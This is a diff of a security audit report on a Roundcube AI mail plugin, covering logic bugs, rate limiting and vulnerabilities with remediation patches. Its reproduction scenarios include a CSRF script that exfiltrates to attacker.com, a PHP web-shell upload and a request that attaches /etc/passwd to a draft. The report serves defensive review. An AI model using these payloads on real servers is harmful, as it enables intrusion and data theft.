@@ -1,133 +1,150 @@
-# Roundcube AI (GenIA) — Comprehensive Application Audit & Optimization Report
+# Comprehensive Application Audit & Optimization Report
 
 **Audit Date:** September 2026  
 **Auditor Roles:** Principal Software Architect, Senior Security Engineer, Domain Mathematician  
 **Workspace:** `webdotpulse/roundcube-AI`  
-**Primary Artifacts Evaluated:** [`lifeprisma_ai.php`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php), [`src/lifeprisma_ai.js`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js), [`config.inc.php.dist`](file:///home/koen/Git/roundcube-AI/config.inc.php.dist), [`skins/elastic/style.css`](file:///home/koen/Git/roundcube-AI/skins/elastic/style.css)
+**Primary Artifacts Evaluated:** [`lifeprisma_ai.php`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php), [`src/lifeprisma_ai.js`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js), [`bin/worker.php`](file:///home/koen/Git/roundcube-AI/bin/worker.php), [`bin/install-extra.php`](file:///home/koen/Git/roundcube-AI/bin/install-extra.php), [`Extra context/plugins/xsignature/xsignature.php`](file:///home/koen/Git/roundcube-AI/Extra%20context/plugins/xsignature/xsignature.php)
 
 ---
 
 ## 1. Executive Summary & Health Score
 
-This comprehensive audit evaluates the Roundcube AI (GenIA) integration across mathematical correctness, architectural resilience, OWASP/CWE security posture, and code maintainability.
+This audit presents an exhaustive evaluation of the Roundcube AI suite covering mathematical algorithms, architectural resilience, OWASP/CWE security posture, and production reliability.
 
 ### Codebase Health Scores (Scale 1–10)
 
 | Dimension | Score | Assessment | Primary Hazard |
 | :--- | :---: | :--- | :--- |
-| **Logic & Mathematical Integrity** | **6.5 / 10** | Tally calculations for spam scores exhibit sign inversion bugs; token pricing logic fails on free-tier ($0) models and suffers IEEE-754 floating-point rounding errors; rate-limiting relies on a delta check rather than an aggregate rate window. | Negative spam tally masked; token price reporting outputs `$NaN` or truncates micro-costs; rate limiter bypassable over time. |
-| **Architecture & Deficiencies** | **4.5 / 10** | Synchronous cURL calls hold Roundcube PHP session locks for up to 120 seconds; global configuration hijacks the Roundcube `users` table with a dummy entity; cache deduplication lacks offline fallback when Redis is absent. | Complete webmail UI lockup during AI generation; SQLite syntax crash on `now()`; runaway draft duplication if Redis is inactive. |
-| **Security, Validation & Hardening** | **3.0 / 10** | Universal absence of CSRF token verification across all plugin action endpoints; unrestricted Blind SSRF to internal networks/cloud metadata via unvalidated `api_url`; PHP Object Injection hazards via `unserialize()`; unescaped DOM XSS injection vectors; Email Header Injection in draft creation. | Remote CSRF admin configuration overwrite; AWS/GCP metadata extraction via SSRF; RCE via deserialization gadget chains; IMAP header tampering. |
-| **Operational Reliability** | **5.0 / 10** | Missing type checks cause fatal PHP 8 TypeError crashes on IMAP search result sets; SSE stream buffers can accumulate arbitrarily large non-SSE payloads without memory bounds; cURL stream fails to terminate on error response. | Worker thread memory exhaustion; daemon process hang; silent background failures. |
+| **Logic & Mathematical Integrity** | **6.0 / 10** | Token pricing ignores dynamic config and truncates $0.00 to `$0.000000`; search memory fallback injects unrelated client Q&A when relevance is 0; rate limiting bypasses aggregate per-minute quotas on background endpoints. | Token pricing display distortion; prompt token waste & context corruption from mismatched memories; API quota exhaustion via rapid background calls. |
+| **Architecture & Deficiencies** | **5.5 / 10** | Caching has been upgraded to multi-tier fallback (Redis -> DB -> File), but global admin configuration hijacks Roundcube's core `users` table; background worker state saving lacks file locking; SSE streaming buffers have unbounded accumulation on gateway errors. | Full-table unindexed scans on `users.preferences`; race condition state corruption in CLI daemon; memory growth on malformed SSE streams. |
+| **Security, Validation & Hardening** | **3.5 / 10** | Template attachment upload lacks extension whitelisting, enabling arbitrary PHP script upload; compose preparation accepts arbitrary file paths enabling local file exfiltration (`/etc/passwd`, DB credentials); global AI memory leaks client correspondence across user accounts; background worker draft generation is vulnerable to CRLF email header injection. | Remote Code Execution (RCE) via uploaded `.php` attachment; Arbitrary Local File Read/Exfiltration; Cross-user tenant data leakage; IMAP header tampering. |
+| **Operational Reliability** | **6.0 / 10** | Worker IMAP client hardcodes SSL peer verification to false; SSE streaming omits token usage reporting; MIME parsing in standalone client is fragile against nested boundaries. | Man-in-the-Middle credential interception; zero token visibility during streaming; silent worker triage dropouts on complex emails. |
 
 ### Primary Risk Areas Requiring Immediate Remediation
-1. **Critical Authentication & Integrity Bypass (CSRF):** While the frontend JavaScript faithfully sends Roundcube's CSRF token `_token`, the backend PHP controller never executes `$rcmail->check_request_token()`. Malicious websites visited by an authenticated Roundcube user can execute requests, modify provider API keys, flush templates, and drain LLM budgets.
-2. **Blind SSRF via Custom Endpoints:** Administrators or attackers (via CSRF) can configure arbitrary API endpoints (e.g. `http://169.254.169.254/latest/meta-data/` or `http://127.0.0.1:6379`). The backend executes raw HTTP POST requests via cURL without restricting IP ranges, hostnames, or protocols.
-3. **Session Lock Denial-of-Service:** In non-streaming requests ([`handle_request()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) and [`handle_autodraft()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1834)), synchronous cURL execution (timeouts up to 120s) occurs before calling `session_write_close()`. During long model reasoning, the user's entire Roundcube webmail session is blocked across all tabs.
-4. **IMAP Search Result Type Crash in `handle_new_messages`:** `rcube_storage::search()` returns an `rcube_result_set` instance. Passing this object directly into `array_reverse()` results in a fatal `TypeError` in PHP 8.0+.
+
+1. **Critical Arbitrary File Upload / Remote Code Execution ([`lifeprisma_ai.php:2086-2098`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2086-L2098)):**
+   The template attachment upload handler (`op=upload_attachment`) moves uploaded files to `data/attachments/templates/<tpl_id>/` without restricting file extensions or MIME types. An authenticated user can upload executable `.php` scripts into the web-accessible directory, achieving Remote Code Execution (RCE).
+2. **Critical Arbitrary File Attachment Exfiltration ([`lifeprisma_ai.php:2580-2594`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2580-L2594)):**
+   `handle_message_compose()` attaches arbitrary file paths provided in the `attachments` array of `plugin.lifeprisma_ai_prepare_compose`. Because absolute paths (e.g. `/etc/passwd` or `config/config.inc.php`) are not checked against a confined directory, Roundcube attaches sensitive server files directly into outgoing draft emails.
+3. **Critical Cross-User Tenant Information Leakage ([`lifeprisma_ai.php:2343-2372`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2343-L2372), [`2520-2535`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2520-L2535)):**
+   AI learned memory is stored in a single shared file (`data/ai_memory.json`). Every outgoing email sent by any user is parsed and added to this global file. When any other user receives an email, those private Q&As are injected into their Gemini prompt, exposing confidential correspondence across users.
+4. **Email Header Injection (CRLF) in Worker ([`bin/worker.php:628-639`](file:///home/koen/Git/roundcube-AI/bin/worker.php#L628-L639)):**
+   The standalone worker crafts RFC 2822 draft emails by concatenating raw email addresses and subjects without stripping `\r\n`, allowing arbitrary header injection and Bcc/Cc hijacking.
+5. **SSRF DNS Rebinding Bypass ([`lifeprisma_ai.php:1761-1782`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1761-L1782)):**
+   `validate_api_url()` returns `true` for any hostname that is not a literal IP address without verifying the resolved IP address, permitting DNS rebinding to internal IP ranges (`127.0.0.1`, `169.254.169.254`, `10.0.0.0/8`).
 
 ---
 
 ## 2. Logic & Mathematical Verification
 
-### Issue 2.1: Asymmetric Sign Inversion in Spamd-Bar Parser
-- **Location:** [`lifeprisma_ai.php:1454-1462`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1454-L1462)
+### Issue 2.1: Irrelevant Memory Injection on Zero-Score Fallback
+- **Location:** [`lifeprisma_ai.php:2374-2410`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2374-L2410)
 - **Observed Formula/Logic:**
   ```php
-  $plus = substr_count($bar, '+');
-  $minus = substr_count($bar, '-');
-  $spam_score = $plus > 0 ? (float) $plus : -1.0 * $minus;
+  public function find_matching_memory($query, array $memories, $limit = 3)
+  {
+      if (empty($memories) || empty($query)) return [];
+      $words = preg_split('/[\s,\.\?\!\:\;]+/', mb_strtolower($query));
+      // ... filter stopwords ...
+      $scored = [];
+      foreach ($memories as $item) {
+          $text = mb_strtolower(($item['question'] ?? '') . ' ' . ($item['subject'] ?? '') . ' ' . ($item['answer'] ?? ''));
+          $score = 0;
+          foreach ($words as $w) {
+              if (mb_strpos($text, $w) !== false) {
+                  $score += 2;
+              }
+          }
+          if ($score > 0) {
+              $scored[] = ['score' => $score, 'item' => $item];
+          }
+      }
+
+      if (empty($scored)) {
+          return array_slice($memories, -($limit)); // BUG: Returns last 3 memories when match score is 0
+      }
+      // ...
+  }
   ```
-- **Mathematical Analysis:**
-  In SpamAssassin / Rspamd, `X-Spamd-Bar` represents score magnitude where each `+` represents $+1.0$ and each `-` represents $-1.0$.
-  When a header contains mixed characters or neutral scores (e.g., `+--` where net score is $1 - 2 = -1.0$):
-  - Under the current ternary logic: If `$plus > 0`, the expression evaluates strictly to `(float) $plus`, completely discarding the negative tally `$minus`. Thus, a message with two negative points and one positive point is classified as $+1.0$ (Spam) instead of $-1.0$ (Ham).
-  - When `$plus == 0` and `$minus == 0` (e.g., whitespace or neutral header), the calculation computes `-1.0 * 0 = -0.0` (IEEE 754 negative zero), polluting serialization and downstream comparisons.
+- **Mathematical & Algorithmic Analysis:**
+  When a query contains no keywords that match any stored memory item ($Score = 0$ for all items), the function returns the last 3 items in the database anyway via `array_slice($memories, -($limit))`. In `handle_triage()` and `call_gemini_triage()`, this injects unrelated Q&As into the prompt:
+  $$\text{Relevance}(Q, M_i) = 0 \implies M_i \in \text{PromptContext}$$
+  This contaminates the prompt context with completely irrelevant instructions, wastes prompt tokens, and forces Gemini to replicate guidance for unrelated topics.
 - **Corrected Formulation:**
-  $$\text{Score} = \begin{cases} \text{Float}(\text{Match}[1]), & \text{if Header matches } \texttt{score=(-?[0-9]+(?:\.[0-9]+)?)} \\ (\text{Count}(+) - \text{Count}(-)) \times 1.0, & \text{if } \text{Count}(+) + \text{Count}(-) > 0 \\ \text{null}, & \text{otherwise} \end{cases}$$
+  $$\text{MatchingMemories}(Q) = \{ M \in \text{Memories} \mid \text{Score}(Q, M) > 0 \} \downarrow_{\text{Score}} [0 \dots \text{limit}-1]$$
+  If $\max(\text{Score}) = 0$, the function MUST return an empty set $\emptyset$.
 - **Remediation Diff:**
   ```diff
   --- a/lifeprisma_ai.php
   +++ b/lifeprisma_ai.php
-  @@ -1447,18 +1447,21 @@ class lifeprisma_ai extends rcube_plugin
-               $spam_score = null;
-               $spam_header = $msg->headers->others['x-spam-status'] ?? '';
-               if (is_array($spam_header)) $spam_header = end($spam_header);
-  -            if ($spam_header && preg_match('/\bscore=(-?[0-9.]+)/i', $spam_header, $m)) {
-  +            if ($spam_header && preg_match('/\bscore=(-?[0-9]+(?:\.[0-9]+)?)/i', $spam_header, $m)) {
-                   $spam_score = (float) $m[1];
-               }
-               // Fallback: X-Spamd-Bar (+ = positive, - = negative)
-               if ($spam_score === null) {
-                   $bar = $msg->headers->others['x-spamd-bar'] ?? '';
-                   if (is_array($bar)) $bar = end($bar);
-                   if ($bar) {
-                       $plus = substr_count($bar, '+');
-                       $minus = substr_count($bar, '-');
-  -                    $spam_score = $plus > 0 ? (float) $plus : -1.0 * $minus;
-  +                    if ($plus > 0 || $minus > 0) {
-  +                        $spam_score = (float) ($plus - $minus);
-  +                    }
-                   }
-               }
+  @@ -2396,7 +2396,7 @@ class lifeprisma_ai extends rcube_plugin
+           }
+
+           if (empty($scored)) {
+  -            return array_slice($memories, -($limit));
+  +            return [];
+           }
+
+           usort($scored, function ($a, $b) {
   ```
 
 ---
 
-### Issue 2.2: Floating-Point Falsy Zero Bug & IEEE-754 Truncation in Token Pricing
-- **Location:** [`src/lifeprisma_ai.js:2203-2223`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2203-L2223)
+### Issue 2.2: Hardcoded Rates, Falsy Zero Formatting, and Config Bypass in Cost Estimation
+- **Location:** [`src/lifeprisma_ai.js:1471-1486`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L1471-L1486)
 - **Observed Formula/Logic:**
   ```javascript
-  var mp = pricing[model];
-  if (mp && mp.input && mp.output) {
-      rates = [mp.input, mp.output];
-      break;
+  function lpai_estimate_cost(model, inpTokens, outTokens) {
+      var inp = Number(inpTokens) || 0;
+      var out = Number(outTokens) || 0;
+      if (inp === 0 && out === 0) return null;
+
+      var rates = [0.30, 2.50]; // Gemini 3.8 / 3.7 / 3.6 / 3.5 Flash default ($ per 1M tokens)
+      if (model && model.indexOf('lite') >= 0) {
+          rates = [0.075, 0.30];
+      } else if (model && model.indexOf('pro') >= 0) {
+          rates = [1.25, 10.00];
+      }
+
+      var cost = (inp * rates[0] + out * rates[1]) / 1000000;
+      if (cost < 0.0001) return '$' + cost.toFixed(6);
+      return '$' + cost.toFixed(4);
   }
-  // ...
-  var cost = (inputTokens * rates[0] + outputTokens * rates[1]) / 1000000;
-  if (cost < 0.0001) return '$' + cost.toFixed(6);
-  return '$' + cost.toFixed(4);
   ```
 - **Mathematical & Logic Analysis:**
-  1. **Falsy Zero Rejection:** In JavaScript, `0` evaluates to `false`. When a provider configures a free model or tier (e.g. Gemini free tier or local Ollama instances where `input: 0`, `output: 0`), `mp.input && mp.output` evaluates to `0 && 0 => false`. As a result, the code ignores the explicit $0.00 pricing tier and falls back to hardcoded dictionaries or returns `null`.
-  2. **Missing Gemini Fallback Rates:** The fallback table [`lpai_pricing`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2188) omitted `gemini-3.6-flash` and `gemini-2.5-flash`. When dynamic pricing is uninitialized, cost calculations return `null`.
-  3. **Unsanitized Numerical Operands:** If tokens arrive as `undefined` or null objects, arithmetic evaluates to `NaN`, rendering `"$NaN"` directly into the user interface.
-  4. **Floating-Point Representation Errors:** Direct evaluation of `(150 * 0.30 + 50 * 2.50) / 1000000` produces `0.00017000000000000002`. Fixed decimal formatting requires bounded rounding to prevent precision artifacts.
-- **Remediation Code:**
+  1. **Zero Falsy Representation:** If `cost === 0` (e.g., free-tier or zero-priced internal models), `cost < 0.0001` evaluates to `true`, producing `"$0.000000"` instead of `"$0.00"`.
+  2. **Config Bypass:** The server passes accurate pricing in `rcmail.env.lpai_gemini.pricing`, which includes explicit rates for `gemini-3.8-flash`, `gemini-3.8-flash-cyber`, `gemini-3.7-flash`, etc. The client completely ignores this environment data and relies on fallback string searches for `'lite'` and `'pro'`.
+  3. **Precision Boundary Artifacts:** Arithmetic on floating points can produce precision errors: $(200 \times 0.30 + 100 \times 2.50) / 10^6 = 0.00031000000000000005$. Formatting must be strictly bounded.
+- **Corrected Formulation:**
+  $$\text{Cost} = \frac{N_{\text{in}} \cdot R_{\text{in}} + N_{\text{out}} \cdot R_{\text{out}}}{10^6}, \quad \text{Formatted} = \begin{cases} \text{null}, & N_{\text{in}} = 0 \land N_{\text{out}} = 0 \\ "\$0.00", & \text{Cost} = 0 \\ "\$"\text{Fixed}(\text{Cost}, 6), & 0 < \text{Cost} < 0.0001 \\ "\$"\text{Fixed}(\text{Cost}, 4), & \text{Cost} \ge 0.0001 \end{cases}$$
+- **Remediation Diff:**
   ```diff
   --- a/src/lifeprisma_ai.js
   +++ b/src/lifeprisma_ai.js
-  @@ -2198,24 +2198,31 @@ var lpai_pricing = {
-       'claude-sonnet-4-6':        [3.00, 15.00],
-       'claude-haiku-4-5-20251001': [0.80, 4.00],
-       'claude-opus-4-6':  [15.00, 75.00],
-  +    'gemini-3.6-flash': [0.30, 2.50],
-  +    'gemini-2.5-flash': [0.30, 2.50],
-   };
-   
-   function lpai_estimate_cost(model, inputTokens, outputTokens) {
-  +    var inCount = Number(inputTokens) || 0;
-  +    var outCount = Number(outputTokens) || 0;
-  +    if (inCount === 0 && outCount === 0) return null;
+  @@ -1473,12 +1473,26 @@ function lpai_estimate_cost(model, inpTokens, outTokens) {
+       var out = Number(outTokens) || 0;
+       if (inp === 0 && out === 0) return null;
+
+  -    var rates = [0.30, 2.50]; // Gemini 3.8 / 3.7 / 3.6 / 3.5 Flash default ($ per 1M tokens)
+  -    if (model && model.indexOf('lite') >= 0) {
+  +    var rates = null;
+  +    var geminiEnv = (window.rcmail && rcmail.env && rcmail.env.lpai_gemini) || {};
+  +    var pricingTable = geminiEnv.pricing || {};
+  +    if (model && pricingTable[model]) {
+  +        var mRates = pricingTable[model];
+  +        rates = [Number(mRates.input) || 0, Number(mRates.output) || 0];
+  +    }
   +
-       var rates = null;
-       var providers = rcmail.env.lpai_providers || {};
-       var pids = Object.keys(providers);
-       for (var i = 0; i < pids.length; i++) {
-           var p = providers[pids[i]];
-           var pricing = p.pricing || {};
-           var mp = pricing[model];
-  -        if (mp && mp.input && mp.output) {
-  -            rates = [mp.input, mp.output];
-  +        if (mp && typeof mp.input !== 'undefined' && typeof mp.output !== 'undefined') {
-  +            rates = [Number(mp.input) || 0, Number(mp.output) || 0];
-               break;
-           }
+  +    if (!rates && model && model.indexOf('lite') >= 0) {
+           rates = [0.075, 0.30];
+  -    } else if (model && model.indexOf('pro') >= 0) {
+  +    } else if (!rates && model && model.indexOf('pro') >= 0) {
+           rates = [1.25, 10.00];
+  +    } else if (!rates) {
+  +        rates = [0.30, 2.50];
        }
-       if (!rates) rates = lpai_pricing[model];
-       if (!rates) return null;
-  -    var cost = (inputTokens * rates[0] + outputTokens * rates[1]) / 1000000;
-  +    var cost = ((inCount * rates[0]) + (outCount * rates[1])) / 1000000;
+
+       var cost = (inp * rates[0] + out * rates[1]) / 1000000;
   +    if (cost === 0) return '$0.00';
        if (cost < 0.0001) return '$' + cost.toFixed(6);
        return '$' + cost.toFixed(4);
@@ -136,432 +153,337 @@ This comprehensive audit evaluates the Roundcube AI (GenIA) integration across m
 
 ---
 
-### Issue 2.3: Array Detection Flaw in Unsupported Parameter Filtering
-- **Location:** [`lifeprisma_ai.php:446-456`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L446-L456)
+### Issue 2.3: Rate Limiting Sliding-Window Bypass on Background Endpoints
+- **Location:** [`lifeprisma_ai.php:1784-1817`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1784-L1817)
 - **Observed Formula/Logic:**
   ```php
-  private function get_unsupported_params($provider, $model)
+  private function check_rate_limit($action = '')
   {
-      $raw = $provider['unsupported_params'] ?? [];
-      if (empty($raw)) return [];
-      if (is_array($raw) && !isset($raw[0])) {
-          return $raw[$model] ?? [];
+      $rcmail = rcmail::get_instance();
+      $cooldown = (int) $rcmail->config->get('lifeprisma_ai_rate_limit', 2);
+      $max_per_min = (int) $rcmail->config->get('lifeprisma_ai_rate_limit_per_min', 60);
+
+      if ($cooldown <= 0 && $max_per_min <= 0) return true;
+
+      $now = microtime(true);
+      $is_bg = in_array($action, ['triage', 'autocomplete', 'detect_tone'], true);
+      $session_key = $is_bg ? 'lpai_last_bg_req' : 'lpai_last_req';
+      $effective_cooldown = $is_bg ? 0.3 : $cooldown;
+
+      if ($effective_cooldown > 0) {
+          $last = isset($_SESSION[$session_key]) ? (float) $_SESSION[$session_key] : 0.0;
+          if ($last > 0 && ($now - $last) >= 0 && ($now - $last) < $effective_cooldown) {
+              return false;
+          }
       }
-      return $raw;
-  }
+
+      if (!$is_bg && $max_per_min > 0) {
+          $history = $_SESSION['lpai_req_hist'] ?? [];
+          // ... slides window ...
+      }
   ```
 - **Mathematical & Logic Analysis:**
-  The logic attempts to discriminate between a flat string array `['temperature', 'reasoning_none']` and an associative map `{'model-id': ['temperature']}` using the heuristic `!isset($raw[0])`.
-  - In PHP, string keys that represent valid integers (e.g. `"0"`) are automatically cast to integer keys by the Zend Engine. If a custom or fine-tuned model identifier is named `"0"` or numeric string `"100"`, `isset($raw[0])` evaluates to `true`.
-  - The method treats the dictionary as a sequential array and returns the entire nested map: `["0" => ["temperature"]]`.
-  - Downstream callers execute `in_array('temperature', $unsupported)`. Because `$unsupported` contains a nested array rather than scalar strings, `in_array()` returns `false`, causing the engine to transmit prohibited parameters to APIs that immediately reject the request with HTTP 400.
+  For background actions (`triage`, `autocomplete`, `detect_tone`), the condition `if (!$is_bg && $max_per_min > 0)` is evaluated. Because `$is_bg` is `true`, the sliding-window frequency limiter is completely skipped:
+  $$\text{MaxRate}_{\text{bg}} = \frac{1}{\text{effective\_cooldown}} = \frac{1}{0.3} \approx 3.33 \text{ req/sec} = 200 \text{ req/min}$$
+  If an autocomplete event triggers on each keystroke or a script cycles unread messages, a user can execute up to 200 requests/min, bypassing the configured `lifeprisma_ai_rate_limit_per_min` (default 60) and exhausting Gemini API rate quotas.
 - **Corrected Formulation:**
-  Use strict list validation via `array_is_list()` (PHP 8.1+) or key inspection to verify sequential index alignment:
-  $$\text{is\_sequential}(A) \iff \text{keys}(A) == [0, 1, \dots, |A|-1]$$
+  Background actions must enforce a dedicated sliding window (e.g., $1.5 \times \text{max\_per\_min}$) rather than no window at all.
 - **Remediation Diff:**
   ```diff
   --- a/lifeprisma_ai.php
   +++ b/lifeprisma_ai.php
-  @@ -448,8 +448,11 @@ class lifeprisma_ai extends rcube_plugin
-           $raw = $provider['unsupported_params'] ?? [];
-           if (empty($raw)) return [];
-  -        // Per-model map: { "gpt-5-nano": ["temperature", "reasoning_none"] }
-  -        if (is_array($raw) && !isset($raw[0])) {
-  +        // Per-model map: associative dictionary keyed by model string
-  +        $is_list = function_exists('array_is_list') 
-  +            ? array_is_list($raw) 
-  +            : (array_keys($raw) === range(0, count($raw) - 1));
-  +        if (is_array($raw) && !$is_list) {
-               return $raw[$model] ?? [];
+  @@ -1802,8 +1802,10 @@ class lifeprisma_ai extends rcube_plugin
            }
-           // Legacy flat array: ["temperature", "reasoning_none"] — applies to all models
-  ```
 
----
+  -        if (!$is_bg && $max_per_min > 0) {
+  -            $history = $_SESSION['lpai_req_hist'] ?? [];
+  +        $hist_key = $is_bg ? 'lpai_bg_hist' : 'lpai_req_hist';
+  +        $effective_max = $is_bg ? ($max_per_min * 2) : $max_per_min;
+  +        if ($effective_max > 0) {
+  +            $history = $_SESSION[$hist_key] ?? [];
+               if (!is_array($history)) $history = [];
+               $history = array_values(array_filter($history, function ($t) use ($now) {
+                   return ($now - (float) $t) < 60.0;
+  @@ -1811,7 +1813,7 @@ class lifeprisma_ai extends rcube_plugin
+  -            if (count($history) >= $max_per_min) return false;
+  +            if (count($history) >= $effective_max) return false;
+               $history[] = $now;
+  -            $_SESSION['lpai_req_hist'] = $history;
+  +            $_SESSION[$hist_key] = $history;
+           }
 
-### Issue 2.4: Rate Limiting: Consecutive Cooldown vs. Sliding Window Quota
-- **Location:** [`lifeprisma_ai.php:749-765`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L749-L765)
-- **Observed Formula/Logic:**
-  ```php
-  $last = $_SESSION[$session_key] ?? 0;
-  $now = microtime(true);
-  if ($now - $last < $cooldown) {
-      return false;
-  }
-  $_SESSION[$session_key] = $now;
+           $_SESSION[$session_key] = $now;
   ```
-- **Mathematical & Logic Analysis:**
-  The implementation tests an instantaneous inter-arrival time $\Delta t = t_k - t_{k-1} < \tau$.
-  - **Sustained Drain Vulnerability:** An automated script issuing 1 request every $3.01$ seconds satisfies $\Delta t \ge 3.0$, generating $1,196$ calls per hour per user. Over an 8-hour workday, a single compromised or abusive mailbox can consume over $9,500$ generation calls, costing upwards of hundreds of dollars in LLM API fees.
-  - **Absence of Token Bucket / Sliding Window:** Rate limiting requires enforcing both a burst cooldown $\Delta t \ge \tau$ and an aggregate volume quota:
-    $$\sum_{i=1}^{N} \mathbb{I}(t - t_i \le W) \le Q_{\max}$$
-    where $W = 3600\text{s}$ and $Q_{\max} = 60\text{ requests}$.
 
 ---
 
 ## 3. Bugs, Vulnerabilities & Edge-Case Vulnerabilities
 
-### Severity Breakdown:
-- **Critical:** 2
-- **High:** 4
-- **Medium:** 3
-- **Low:** 2
-
----
-
-### [CRITICAL] Issue 3.1: Universal Absence of CSRF Token Verification on Action Endpoints
-- **CWE:** [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
-- **Affected Endpoints & Files:**
-  - [`lifeprisma_ai.php:526`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L526) (`handle_admin_save`)
-  - [`lifeprisma_ai.php:815`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L815) (`handle_stream`)
-  - [`lifeprisma_ai.php:1175`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) (`handle_request`)
-  - [`lifeprisma_ai.php:686`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L686) (`handle_templates`)
-  - [`lifeprisma_ai.php:1834`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1834) (`handle_autodraft`)
+### [CRITICAL] Issue 3.1: Arbitrary File Upload (Remote Code Execution) in Template Attachments
+- **Location:** [`lifeprisma_ai.php:2086-2098`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2086-L2098)
+- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
 - **Reproduction Scenario:**
-  1. An authenticated Roundcube administrator visits an external website containing:
-     ```html
-     <script>
-     fetch('https://mail.victim-corp.com/?_task=settings&_action=plugin.lifeprisma_ai_admin_save', {
-         method: 'POST',
-         credentials: 'include',
-         headers: { 'Content-Type': 'application/json' },
-         body: JSON.stringify({
-             providers: {
-                 'exfil': {
-                     api_url: 'https://attacker.com/collect',
-                     api_key: 'attacker_key',
-                     model: 'exfil'
-                 }
-             },
-             settings: { default_provider: 'exfil' }
-         })
+  1. An authenticated user sends a POST request to `?_task=mail&_action=plugin.lifeprisma_ai_templates`:
+     ```http
+     POST /?_task=mail&_action=plugin.lifeprisma_ai_templates HTTP/1.1
+     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+     ...
+     ------WebKitFormBoundary
+     Content-Disposition: form-data; name="op"
+     upload_attachment
+     ------WebKitFormBoundary
+     Content-Disposition: form-data; name="tpl_id"
+     123
+     ------WebKitFormBoundary
+     Content-Disposition: form-data; name="file"; filename="shell.php"
+     Content-Type: application/x-php
+
+     <?php system($_GET['cmd']); ?>
+     ------WebKitFormBoundary--
+     ```
+  2. The server moves the file to `plugins/lifeprisma_ai/data/attachments/templates/123/shell.php`.
+  3. The attacker navigates directly to `https://<domain>/plugins/lifeprisma_ai/data/attachments/templates/123/shell.php?cmd=id`, achieving full Remote Code Execution as the web server user (`www-data`/`nginx`).
+- **Remediation Diff:**
+  ```diff
+  --- a/lifeprisma_ai.php
+  +++ b/lifeprisma_ai.php
+  @@ -2086,10 +2086,21 @@ class lifeprisma_ai extends rcube_plugin
+               $clean_tpl_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $tpl_id);
+               $upload_dir = $this->home . '/data/attachments/templates/' . $clean_tpl_id;
+               if (!is_dir($upload_dir)) {
+  -                @mkdir($upload_dir, 0755, true);
+  +                @mkdir($upload_dir, 0750, true);
+               }
+
+  -            $safe_name = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($file['name']));
+  +            $orig_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+  +            $disallowed_exts = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'phar', 'inc', 'sh', 'cgi', 'pl', 'py', 'exe', 'htaccess'];
+  +            if (in_array($orig_ext, $disallowed_exts, true) || empty($orig_ext)) {
+  +                echo json_encode(['status' => 'error', 'message' => 'Disallowed or dangerous file extension']);
+  +                exit;
+  +            }
+  +
+  +            // Prevent executable file upload and enforce strict whitelist
+  +            $allowed_exts = ['pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt', 'csv', 'png', 'jpg', 'jpeg', 'gif', 'zip'];
+  +            if (!in_array($orig_ext, $allowed_exts, true)) {
+  +                echo json_encode(['status' => 'error', 'message' => 'File type not permitted']);
+  +                exit;
+  +            }
+  +            $safe_name = md5(uniqid((string) microtime(), true)) . '_' . preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($file['name']));
+               $target_path = $upload_dir . '/' . $safe_name;
+
+               if (!move_uploaded_file($file['tmp_name'], $target_path)) {
+  ```
+
+---
+
+### [CRITICAL] Issue 3.2: Arbitrary Local File Read / Exfiltration via Compose Preparation
+- **Location:** [`lifeprisma_ai.php:2580-2594`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2580-L2594)
+- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory / Path Traversal), CWE-200 (Exposure of Sensitive Information)
+- **Reproduction Scenario:**
+  1. An attacker sends an AJAX request:
+     ```javascript
+     $.post('?_task=mail&_action=plugin.lifeprisma_ai_prepare_compose', {
+         _token: rcmail.env.request_token,
+         reply: 'Check this attachment.',
+         subject: 'Sensitive Data',
+         attachments: JSON.stringify([{ path: '/etc/passwd', name: 'passwd.txt' }])
      });
-     </script>
      ```
-  2. Because Roundcube session cookies are submitted automatically and the backend never calls `$rcmail->check_request_token()`, the configuration is overwritten. All future internal emails processed by GenIA are exfiltrated to `attacker.com`.
-- **Root Cause:**
-  `rcube_plugin` actions do not enforce CSRF protection by default; plugins must invoke `$rcmail->check_request_token()` on state-changing or authenticated actions.
-- **Remediation Patch:**
+  2. The attacker triggers `rcmail.open_window('?_task=mail&_action=compose')`.
+  3. `handle_message_compose()` checks:
+     ```php
+     $full_path = $att['path'] ?? ''; // '/etc/passwd'
+     if (!empty($full_path) && strpos($full_path, '/') !== 0) { ... } // Skipped because it starts with '/'
+     if (file_exists($full_path)) {
